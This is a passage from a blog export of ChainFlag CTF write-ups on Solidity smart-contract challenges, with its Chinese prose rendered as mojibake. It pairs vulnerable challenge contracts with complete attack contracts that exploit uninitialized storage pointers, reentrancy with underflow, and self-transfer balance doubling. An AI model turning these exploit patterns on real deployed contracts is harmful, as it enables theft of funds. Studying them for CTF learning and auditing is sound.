beOwner()å‡½æ•°ç®€ç›´å°±æ˜¯èµ¤è£¸è£¸çš„è¯ˆéª—å•Šï¼ï¼ï¼ // game.beOwner&#123;value: msg.value&#125;(); uint codex_0 = uint(keccak256(abi.encodePacked(uint(5)))); // codex[0]æ‰€åœ¨ä½ç½® uint codex_length = type(uint256).max - codex_0; // codexæ•°ç»„åˆ°EVMå­˜å‚¨ç©ºé—´æœ«å°¾çš„è·ç¦» uint owner_index = codex_length + 7; // å˜é‡ownerç›¸å¯¹äºæ•°ç»„çš„ä½ç½® game.revise(owner_index, bytes32(uint(uint160(address(this))))); // æˆä¸ºowner // å¤ºæ—— game.payforflag(); &#125; receive() external payable &#123; // ç”¨äºå°†é’±è½¬å› EOA å¯åŠ å¯ä¸åŠ  //(bool success, ) = owner.call&#123;value:address(msg.sender).balance&#125;(&quot;&quot;); &#125;&#125;contract Deployer &#123; function deploy(uint _salt) public returns(address)&#123; bytes memory bytecode = type(FakeOwnerGameHack).creationCode; bytes32 salt = keccak256(abi.encodePacked(_salt)); address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; return addr; &#125; function pay(address payable to) public payable &#123; selfdestruct(to); &#125;&#125; Bank1. questionæºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879pragma solidity ^0.4.24;contract Bank &#123; event SendEther(address addr); event SendFlag(address addr); address public owner; uint randomNumber = 0; constructor() public &#123; owner = msg.sender; &#125; struct SafeBox &#123; bool done; function(uint, bytes12) internal callback; bytes12 hash; uint value; &#125; SafeBox[] safeboxes; struct FailedAttempt &#123; uint idx; uint time; bytes12 triedPass; address origin; &#125; mapping(address =&gt; FailedAttempt[]) failedLogs; modifier onlyPass(uint idx, bytes12 pass) &#123; if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123; FailedAttempt info; info.idx = idx; info.time = now; info.triedPass = pass; info.origin = tx.origin; failedLogs[msg.sender].push(info); &#125; else &#123; _; &#125; &#125; function deposit(bytes12 hash) payable public returns(uint) &#123; SafeBox box; box.done = false; box.hash = hash; box.value = msg.value; if (msg.sender == owner) &#123; box.callback = sendFlag; &#125; else &#123; require(msg.value &gt;= 1 ether); box.value -= 0.01 ether; box.callback = sendEther; &#125; safeboxes.push(box); return safeboxes.length-1; &#125; function withdraw(uint idx, bytes12 pass) public payable &#123; SafeBox box = safeboxes[idx]; require(!box.done); box.callback(idx, pass); box.done = true; &#125; function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; msg.sender.transfer(safeboxes[idx].value); emit SendEther(msg.sender); &#125; function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); selfdestruct(owner); &#125;&#125; ğŸ“Œ æˆåŠŸè°ƒç”¨sendFlag()ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºè§¦å‘SendFlagäº‹ä»¶ã€‚ 2. analysis è§‚å¯Ÿå¯å‘ç°åœ¨depositå‡½æ•°å’ŒonlyPassè£…é¥°å™¨ä¸­å‡å­˜åœ¨æœªåˆå§‹åŒ–å­˜å‚¨æŒ‡é’ˆæ¼æ´ã€‚ ç»“åˆå¸ƒå±€æ¥çœ‹ï¼Œdepositå‡½æ•°ä¸­çš„boxç»“æ„ä½“å¯ä»¥æ”¹å†™ownerå’ŒrandomNumberã€‚å¦‚æœèƒ½å°†owneræ”¹ä¸ºattackerçš„åœ°å€ï¼Œå°±å¯ä»¥å°†boxçš„å›è°ƒè®¾ç½®ä¸ºsendFlagå‡½æ•°ï¼Œä»è€Œè°ƒç”¨ï¼Œä½†ä»ç„¶ç»•ä¸è¿‡msg.value &gt;= 100000000 etherçš„é™åˆ¶ï¼Œå› æ­¤ä¸å¯è¡Œã€‚ è€ŒonlyPassä¸­çš„FailedAttempç»“æ„ä½“è¿˜å¯æ”¹å†™safeboxesæ•°ç»„çš„é•¿åº¦ã€‚è‹¥æ”¹å†™é•¿åº¦ä¸ºnï¼Œåˆ™withdrawå‡½æ•°æ‰§è¡Œå›è°ƒæ—¶å³å¯ç›´æ¥è®¿é—®safeboxes[i] (i&lt;n)ã€‚åŒæ—¶ç”±äºFailedAttemptä¸­çš„triedPassè¿™12ä¸ªå­—èŠ‚æ˜¯å¯æ§çš„ï¼Œå› æ­¤åªè¦æ‰¾åˆ°safeboxes[i] -&gt; FailedAttempt.treidPassï¼Œå†è®¾ç½®å¥½åˆé€‚çš„treidPassæ•°æ®ï¼Œå³å¯é€šè¿‡box[i]çš„å›è°ƒç›´æ¥è·³è½¬åˆ°è§¦å‘SendFlagäº‹ä»¶çš„ä»£ç ç»§ç»­æ‰§è¡Œã€‚ é€šè¿‡åç¼–è¯‘å¯ä»¥æ‰¾åˆ° emit SendFlag(msg.sender);çš„åœ°å€ä¸ºï¼š0x070F åˆçº¦çš„slotå­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š 123456789-----------------------------------------------------| unused (12) | owner (20) | &lt;- slot 0-----------------------------------------------------| randomNumber (32) | &lt;- slot 1-----------------------------------------------------| safeboxes.length (32) | &lt;- slot 2-----------------------------------------------------| occupied by failedLogs but unused (32) | &lt;- slot 3----------------------------------------------------- safeboxå­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š 12345-----------------------------------------------------| unused (11) | hash (12) | callback (8) | done (1) |-----------------------------------------------------| value (32) |----------------------------------------------------- faillogå­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š 1234567-----------------------------------------------------| idx (32) |-----------------------------------------------------| time (32) |-----------------------------------------------------| origin (20) | triedPass (12) |----------------------------------------------------- é¦–å…ˆï¼Œè¦åˆ¶é€ å‡ºè¿›å…¥onlyPassçš„æ¡ä»¶å…¥å£ï¼ŒæŒ‡é€šè¿‡depositå‡½æ•°å°†callbackè®¾ç½®æˆsendEtheræ‰å¯ä»¥ã€‚ å¼•ç”¨å¤§ä½¬çš„åˆ†æï¼š 123456789101112131415161718FailedLogs[0] = keccak256(0||3)FailedLogs[msg.sender] = keccak256(msg.sender||3)keccak256(msg.sender||3) = FailedAttempt.lengthFailedAttempt[0] = keccak256(keccak256(msg.sender||3)) + 0*3FailedAttempt[0].triedPass = keccak256(keccak256(msg.sender||3)) + 2// è¿™æ˜¯safeboxçš„è®¡ç®—å¼box[0] = keccak256(2)box[i] = keccak256(2) + i*2// å¦‚ä½•è®©box[i] è¯»å–åˆ° FailedAttempt[0].triedPassçš„å€¼box[i] -&gt; FailedAttempt[0].triedPasskeccak256(2) + i*2 = keccak256(keccak256(msg.sender||3)) + 2i = (keccak256(keccak256(msg.sender||3)) + 2 - keccak256(2)) / 2i = (failedAttempAddr + 2 - boxAddr) / 2 åˆ†æï¼šå› ä¸º SafeBox ç»“æ„ä½“å ä¸¤ä¸ª slotï¼Œæ‰€ä»¥ safeboxes[i] çš„å­˜å‚¨ä½ç½®ä¸ºï¼škeccak(2) + i * 2 ï¼› åŒç†FailedAttemptæ•°ç»„ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡å…¶å ç”¨çš„æ˜¯ä¸‰ä¸ªslotï¼Œè€ŒFailedAttempt[0].triedPassçš„ä½ç½®åœ¨keccak256(keccak256(msg.sender||3)) + 2ï¼Œæ‰€ä»¥å°±æœ‰äº†idxçš„è®¡ç®—å¼å¦‚ä¸‹ï¼š 123keccak256(2) + i*2 = keccak256(keccak256(msg.sender||3)) + 2i = (keccak256(keccak256(msg.sender||3)) + 2 - keccak256(2)) / 2i = (failedAttempAddr + 2 - boxAddr) / 2 helperåˆçº¦å°±æ˜¯ç”¨äºè®¡ç®—ä½¿ç”¨çš„ã€‚ è¿™é‡Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼ši &lt; boxLengthï¼Œå³i &lt; msg.sender||triedPassï¼Œè¿˜è¦åˆ¤æ–­æ˜¯å¦å¯ä»¥æ•´é™¤2ï¼Œè‹¥ä¸èƒ½æ•´é™¤åˆ™ä¹Ÿä¸ç¬¦åˆè¦æ±‚ï¼Œbox[i]ä¼šæŒ‡å‘timeå­—æ®µã€‚æ•…å¯¹attackerçš„åœ°å€ä¹Ÿæœ‰æ‰€é™åˆ¶ã€‚ è‡³äºä¸ºä»€ä¹ˆè¦æ•´é™¤2å‘¢ï¼Œæˆ‘çš„ç†è§£æ˜¯ï¼Œé¦–å…ˆåœ¨solidityä¸­å¯¹å°æ•°é‡‡å–èˆå¼ƒçš„æ–¹æ³•ï¼Œé‚£ä¹ˆï¼Œæ¯”å¦‚ åœ¨ slot1ï¼Œslot2ï¼Œslot3ä¸­ï¼Œæˆ‘è¦è·³è½¬åˆ°ï¼Œslot2çš„ä½ç½®ï¼Œ 3. solveæ”»å‡»åˆçº¦ tx.origin&#x3D;0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657contract BankHacker &#123; Bank bank; constructor (address _bank) public &#123; bank = Bank(_bank); &#125; function pwn() public payable &#123; require(msg.value &gt;= 1 ether, &quot;You must pay 1 ether&quot;); // 1. make id[0].callback = sendEther to into onlyPass bank.deposit.value(1 ether)(bytes12(uint96(0))); // parameter is arbitrary // 2. cover the box[i]&#x27;s callback, pass: 000000000000070F00 bank.withdraw(0, 0x999999000000000000070F00); // 3. calculate the idx uint idx = (new BankHelper()).calIdx(address(this)); // the address is address(this)!!!! // 4. capture the falg bank.withdraw(idx, bytes12(uint96(0))); &#125;&#125;contract BankHelper &#123; // è®¡ç®—å‡º FailedAttempt[0] function calFailedAttempt_0(address addr) public pure returns(uint) &#123; return uint(keccak256(keccak256(abi.encodePacked(bytes32(addr), bytes32(3))))); &#125; // è®¡ç®—å‡º safeboxes[0] function calBox_0() public pure returns(uint) &#123; return uint(keccak256(uint(2))); &#125; // è®¡ç®—idx function calIdx(address hacker) public returns (uint) &#123; return (calFailedAttempt_0(hacker) + 2 - calBox_0()) / 2; &#125; // ç¡®ä¿length &gt; idx function compareLength(address hacker) public returns(bool) &#123; return bytes20(hacker) &gt; bytes20(bytes32(calIdx(hacker))); &#125; function isDivsibleBy2(address hacker) public returns(bool) &#123; return (calFailedAttempt_0(hacker) + 2 - calBox_0()) % 2 == 0; &#125; function uintTobytes32(uint num) public returns(bytes32)&#123; return bytes32(num); &#125;&#125; æ€»ç»“ å‰å››é“é¢˜è¿˜å¥½ï¼Œæœ€åä¸€é“å°±å¾ˆæœ‰æŒ‘æˆ˜æ€§äº†ï¼ŒçŸ¥é“äº†å¦‚ä½•è®¡ç®—ç»„åˆå‹çš„å˜é‡çš„å­˜å‚¨ä½ç½®ï¼Œå¦‚mapping(address&#x3D;&gt;struct)ç±»å‹çš„ã€‚ä¹Ÿä¸ºæˆ‘ä»¥ååšé¢˜æä¾›äº†æ–°æ€è·¯ï¼Œå°±æ˜¯å›å½’åˆ°åº•å±‚ï¼Œé€šè¿‡æ“ä½œEVMæ¥è¾¾åˆ°ç›®çš„ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"public_blockchain(2)âŒ","slug":"CTFS/ChainFlag/public blockchain/public_blockchain(2)","date":"2023-08-26T06:50:10.000Z","updated":"2023-08-26T06:50:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/public blockchain/public_blockchain(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/public%20blockchain/public_blockchain(2)/","excerpt":"","text":"è¿™ä¸æ˜¯solidityï¼Œå°±ä¸å‚åˆäº†ğŸ¤ª","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"reentrancy(2)","slug":"CTFS/ChainFlag/reentrancy/reentrancy(2)","date":"2023-08-26T01:50:10.000Z","updated":"2023-08-26T01:50:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/reentrancy/reentrancy(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/reentrancy/reentrancy(2)/","excerpt":"","text":"babybank1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566pragma solidity ^0.4.23;contract babybank &#123; mapping(address =&gt; uint) public balance; mapping(address =&gt; uint) public level; address owner; uint secret; //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough. //Gmail is ok. 163 and qq may have some problems. event sendflag(string md5ofteamtoken,string b64email); constructor()public&#123; owner = msg.sender; &#125; //pay for flag function payforflag(string md5ofteamtoken,string b64email) public&#123; require(balance[msg.sender] &gt;= 10000000000); balance[msg.sender]=0; owner.transfer(address(this).balance); emit sendflag(md5ofteamtoken,b64email); &#125; modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; //challenge 1 function profit() public&#123; require(level[msg.sender]==0); require(uint(msg.sender) &amp; 0xffff==0xb1b1); balance[msg.sender]+=1; level[msg.sender]+=1; &#125; //challenge 2 function set_secret(uint new_secret) public onlyOwner&#123; secret=new_secret; &#125; function guess(uint guess_secret) public&#123; require(guess_secret==secret); require(level[msg.sender]==1); balance[msg.sender]+=1; level[msg.sender]+=1; &#125; //challenge 3 function transfer(address to, uint amount) public&#123; require(balance[msg.sender] &gt;= amount); require(amount==2); require(level[msg.sender]==2); balance[msg.sender] = 0; balance[to] = amount; &#125; function withdraw(uint amount) public&#123; require(amount==2); require(balance[msg.sender] &gt;= amount); msg.sender.call.value(amount*100000000000000)(); balance[msg.sender] -= amount; &#125;&#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag() 2.analysis ä¸€çœ¼çœ‹å‡º ç³»åˆ—ä¸ºé‡å…¥ç³»åˆ—ï¼Œæœ€ä¸ºæ˜æ˜¾çš„æ¼æ´åœ¨äºwithdraw() 123456function withdraw(uint amount) public&#123; require(amount==2); require(balance[msg.sender] &gt;= amount); msg.sender.call.value(amount*100000000000000)(); balance[msg.sender] -= amount;&#125; å…ˆè½¬è´¦å†æ›´æ–°ä½™é¢ï¼Œç»å…¸é‡å…¥ profit()é€šè¿‡create2è®¡ç®—åœ°å€ï¼Œå¹¶è·åˆ© guess()ä½¿å¾—balance[msg.sender] &#x3D;&#x3D; 2 åœ¨msg.senderçš„å›è°ƒå‡½æ•°ä¸­è°ƒç”¨ä¸€æ¬¡è½¬è´¦æ“ä½œï¼Œä½¿å¾—åœ¨ withdrawä¸­å‘ç”Ÿä¸‹æº¢ è¿˜éœ€è¦é€šè¿‡selfdestructç»™é¢˜ç›®åˆçº¦å¼ºåˆ¶èµšé’±ï¼Œä¸ºäº†æ»¡è¶³msg.sender.call.value(amount*100000000000000)(); 3. solveæ”»å‡»é€»è¾‘ï¼šé€šè¿‡è„šæœ¬è¯­è¨€è®¡ç®—å‡ºç¬¦åˆè¦æ±‚çš„hackeråœ°å€çš„saltï¼Œå†é€šè¿‡Helperåˆçº¦çš„deployå‡½æ•°ç”Ÿæˆhackerï¼Œç„¶åé€šè¿‡payå‡½æ•°å¼ºåˆ¶ç»™bankè½¬é’±ï¼Œæ ¹æ®åœ°å€ç”Ÿæˆhackerä¹‹åï¼Œè°ƒç”¨attackå‡½æ•°å³å¯å®Œæˆæ”»å‡»ã€‚ æ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.8.0;interface babybank&#123; function payforflag(string memory, string memory) external; function profit() external; function guess(uint guess_secret) external; function transfer(address to, uint amount) external; function withdraw(uint amount) external; &#125;contract Hacker &#123; babybank bank; bool flag; function attack(address _bank, uint guess_secret) public &#123; bank = babybank(_bank); bank.profit(); bank.guess(guess_secret); bank.withdraw(2); bank.payforflag(&quot;HC&quot;, &quot;Hacker&quot;); &#125; fallback() external payable&#123; if (!flag) &#123; flag = true; bank.transfer(msg.sender, 2); &#125; &#125;&#125;contract Helper &#123; function deploy(uint _salt) public returns(address) &#123; address hacker = address(new Hacker&#123;salt : keccak256(abi.encodePacked(_salt))&#125;()); return hacker; &#125; function pay(address payable bank) public payable &#123; selfdestruct(bank); &#125;&#125; h4ck1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135pragma solidity ^0.4.25;contract owned &#123; address public owner; constructor () public &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function transferOwnership(address newOwner) public onlyOwner &#123; owner = newOwner; &#125;&#125;contract challenge is owned&#123; string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply; mapping (address =&gt; uint256) public balanceOf; mapping (address =&gt; uint256) public sellTimes; mapping (address =&gt; mapping (address =&gt; uint256)) public allowance; mapping (address =&gt; bool) public winner; event Transfer(address _from, address _to, uint256 _value); event Burn(address _from, uint256 _value); event Win(address _address,bool _win); constructor ( uint256 initialSupply, string tokenName, string tokenSymbol ) public &#123; totalSupply = initialSupply * 10 ** uint256(decimals); balanceOf[msg.sender] = totalSupply; name = tokenName; symbol = tokenSymbol; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); emit Transfer(_from, _to, _value); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123; require(_value &lt;= allowance[_from][msg.sender]); allowance[_from][msg.sender] -= _value; _transfer(_from, _to, _value); return true; &#125; function approve(address _spender, uint256 _value) public returns (bool success) &#123; allowance[msg.sender][_spender] = _value; return true; &#125; function burn(uint256 _value) public returns (bool success) &#123; require(balanceOf[msg.sender] &gt;= _value); balanceOf[msg.sender] -= _value; totalSupply -= _value; emit Burn(msg.sender, _value); return true; &#125; function balanceOf(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true; &#125; function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true; &#125; function kill(address _address) public onlyOwner &#123; selfdestruct(_address); &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; ğŸ“Œ æˆåŠŸè°ƒç”¨winnerSubmit() 2.analysis winnerSubmit()è¦æ±‚require(sellTimes[msg.sender] &gt; 100);è€Œæ¶‰åŠåˆ°sellTimes[]çš„å‡½æ•°ä¸ºsell()è§‚å¯Ÿè¯¥å‡½æ•°æœ‰æ˜æ˜¾çš„é‡å…¥é£é™© 12345678910function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true;&#125; sellTimes[msg.sender] -= 1;åœ¨æ‰§è¡Œè½¬è´¦æ“ä½œä¹‹åå†æ›´æ–°ï¼Œè€Œä¸”æ–­è¨€require(sellTimes[msg.sender] &gt; 0);è¦æ±‚å…¶å€¼å¿…é¡»å¤§äº0ï¼Œè€Œèƒ½å¢åŠ è¯¥å€¼çš„å‡½æ•°ä¸ºbuy()å‡½æ•°ï¼Œä½†å…¶å‡½æ•°è¦æ±‚ä½™é¢å¿…é¡»ä¸º0ä¸”æ‰§è¡Œä¹‹åsellTimes[msg.sender]åªèƒ½ä¸º1ã€‚æ‰€ä»¥sell()ä¸­çš„require(sellTimes[msg.sender] &gt; 0);å¯ä»¥æ»¡è¶³ï¼Œå†çœ‹åˆ°require(balanceOf[msg.sender] &gt;= _amount);ï¼Œè¦æ±‚balanceéœ€è¦å¤§äºamountï¼Œèƒ½æ”¹å˜è¯¥å€¼çš„åŒæ ·buy()ä¹Ÿå¯ä»¥ã€‚åˆ†æ_transfer()å‡½æ•°ï¼š 12345678910111213141516171819function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); emit Transfer(_from, _to, _value);&#125; å¾ˆæ˜æ˜¾ï¼Œæœ‰ä¸ªæ¼æ´ï¼Œå³ï¼šè‡ªå·±ç»™è‡ªå·±è½¬é’±å¯ä»¥è·å¾—åŒå€çš„é’±ã€‚ soï¼Œå¯ä»¥é€šè¿‡buy()è·å– 1banlanceï¼Œç„¶åé‡å¤ç»™è‡ªå·±è½¬é’±ï¼Œè½¬ 2 ^ 8 &#x3D;&#x3D; 256 &gt; 200å³å¯ã€‚ä¸ºä»€ä¹ˆè¦è½¬å…«æ¬¡å‘¢ï¼Œç»§ç»­åˆ†æã€‚ å› ä¸ºï¼Œè¦ä½¿require(sellTimes[msg.sender] &gt; 100);æ¯«æ— ç–‘é—®æº¢å‡ºæ¥çš„æœ€å¿«ï¼Œè€Œmsg.sender.call.value(_amount)();åˆ™å®Œç¾çš„ç»™æˆ‘ä»¬æä¾›äº†æº¢å‡ºçš„å¯è¡Œæ€§ï¼Œå³ä¸¤æ¬¡è°ƒç”¨sell()å‡½æ•°ï¼Œåœ¨ç¬¬ä¸€æ¬¡sellTimes[msg.sender] == 1çš„æ—¶å€™é€šè¿‡å›è°ƒå‡½æ•°è°ƒç”¨sellï¼Œæ­¤æ—¶åœ¨æ”»å‡»åˆçº¦çš„å›è°ƒå‡½æ•°ä¸­å†æ¬¡æ‰§è¡Œsellï¼Œæ”»å‡»åˆçº¦ä¸­æ‰§è¡Œå®Œå›è°ƒå‡½æ•°ä¸­çš„sell()æ—¶ï¼ŒsellTimes[msg.sender]å·²ç»ä¸º0ï¼Œè€Œæ­¤æ—¶ä»£ç å›åˆ°æœ€åˆçš„sell()å‡½æ•°ä¸­ï¼Œè¿™æ ·ä¸€æ¥å°±å¯ä»¥é€šè¿‡0 - 1å®ç°æº¢å‡ºã€‚æ‰€ä»¥éœ€è¦æ‰§è¡Œä¸¤æ¬¡sell()å‡½æ•°ï¼Œè¦æ±‚address(this).balance &gt;= 200ï¼ŒbalanceOf[msg.sender] &gt;= 200ã€‚ 3. solveæ”»å‡»é€»è¾‘ï¼šéƒ¨ç½²h4ckï¼Œå¾€åˆçº¦ä¸­è½¬å…¥è‡³å°‘1tokensï¼ˆæˆ‘è§‰å¾—é¢˜ç›®æœ¬æ¥å°±åº”è¯¥æœ‰tokensï¼Œä¸ç„¶å‡½æ•°sell()æ— æ³•æ‰§è¡Œï¼‰ï¼Œéƒ¨ç½²hackerï¼Œè¿›è¡Œæ”»å‡» æ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435contract Hacker &#123; challenge challenge_; bool flag; constructor(address _challenge) public payable &#123; require(msg.value == 200 wei); challenge_ = challenge(_challenge); (new Helper).value(200 wei)(_challenge); &#125; function attack() public payable &#123; require(msg.value == 1 wei); challenge_.buy.value(1 wei)(); for (uint i; i &lt; 8; i++) &#123; challenge_.transfer(address(this), challenge_.balanceOf(address(this))); &#125; challenge_.sell(100); require(challenge_.winnerSubmit(), &quot;you are not winner&quot;); &#125; function() external payable&#123; if (!flag) &#123; flag = true; challenge_.sell(100); &#125; &#125;&#125;contract Helper &#123; constructor(address _challenge) public payable &#123; selfdestruct(_challenge); &#125;&#125; æ€»ç»“è¿™é‡Œè€ƒæŸ¥çš„æ˜¯é‡å…¥ï¼Œemmmï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œé‡å…¥æœ€æ˜æ˜¾çš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯ï¼šé’±çš„æ›´æ–°åœ¨è½¬è´¦æ“ä½œä¹‹åï¼Œè¿™æ ·ä¸€æ¥hackerå¯ä»¥åœ¨å›è°ƒå‡½æ•°ä¸­æ‰§è¡Œæ¶æ„æ“ä½œï¼Œå› ä¸ºé’±è¿˜æ²¡æ”¹å˜å°±å¯ä»¥ä¸€ç›´é€šè¿‡è½¬è´¦å‰çš„åˆ¤æ–­æ¡ä»¶ï¼Œä»è€Œå®ç°ä»»æ„æ¬¡çš„è°ƒç”¨ï¼Œæœ€ç®€å•çš„æ”¹è¿›æ–¹æ³•å°±æ˜¯ï¼Œå…ˆæ›´æ–°é’±å†æ‰§è¡Œè½¬è´¦ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"crypto(3)âŒ","slug":"CTFS/ChainFlag/crypto/crypto(3)","date":"2023-08-24T01:50:10.000Z","updated":"2023-08-24T01:50:10.000Z","comments":true,"path":"2023/08/24/CTFS/ChainFlag/crypto/crypto(3)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/24/CTFS/ChainFlag/crypto/crypto(3)/","excerpt":"","text":"EVMEnc1. questionæºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485pragma solidity ^0.5.10;contract EVMEnc &#123; uint public result; string public key; uint private delta; uint public output; uint32 public sum; uint224 private tmp_sum=0; uint32 private key0; uint224 private t0=0; uint32 private key1; uint224 private t1=0; uint32 private key2; uint224 private t2=0; uint32 private key3; uint224 private t3=0; constructor() public &#123; delta = 0xb3c6ef3720; &#125; function Convert(string memory source) public pure returns (uint result) &#123; bytes32 tmp; assembly &#123; tmp := mload(add(source, 32)) &#125; result = uint(tmp) / 0x10000000000000000; &#125; function set_key(string memory tmp) public &#123; key = tmp; &#125; function cal_(uint x) public &#123; uint tmp = Convert(key) / 0x10000000000000000; result = tmp % x; &#125; function Encrypt(string memory flag) public &#123; uint tmp = Convert(flag); uint key_tmp = Convert(key) / 0x10000000000000000; assembly &#123; let first,second sstore(5, and(shr(96, key_tmp), 0xffffffff)) sstore(6, and(shr(64, key_tmp), 0xffffffff)) sstore(7, and(shr(32, key_tmp), 0xffffffff)) sstore(8, and(key_tmp, 0xffffffff)) let step := 1 for &#123; let i := 1 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; &#123; first := and(shr(mul(add(sub(24, mul(i, 8)), 4), 8), tmp), 0xffffffff) second := and(shr(mul(sub(24, mul(i, 8)), 8), tmp), 0xffffffff) sstore(4, 0) for &#123;let j := 0 &#125; lt(j, 32) &#123; j := add(j, 1) &#125; &#123; sstore(4, and(add(and(sload(4), 0xffffffff), shr(5, sload(2))), 0xffffffff)) let tmp11 := and(add(and(mul(second, 16), 0xffffffff), and(sload(5), 0xffffffff)), 0xffffffff) let tmp12 := and(add(second, and(sload(4),0xffffffff)), 0xffffffff) let tmp13 := and(add(div(second, 32), and(sload(6),0xffffffff)), 0xffffffff) first := and(add(first, xor(xor(tmp11, tmp12), tmp13)), 0xffffffff) let tmp21 := and(add(and(mul(first, 16), 0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) let tmp22 := and(add(first, and(sload(4),0xffffffff)), 0xffffffff) let tmp23 := and(add(div(first, 32), and(sload(8),0xffffffff)), 0xffffffff) second := and(add(second, xor(xor(tmp21, tmp22), tmp23)), 0xffffffff) &#125; sstore(3, add(sload(3), add(shl(sub(192, mul(step, 32)), first), shl(sub(192, mul(i, 64)), second)))) step := add(step, 2) &#125; &#125; &#125;&#125; 2. analysis 3. solveEasyFJump1. questionæºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849pragma solidity ^0.4.23;contract EasyFJump &#123; uint private Variable_a; uint private Variable_b; uint private Variable_m; uint private Variable_s; event ForFlag(address addr); struct Func &#123; function() internal f; &#125; constructor() public payable &#123; 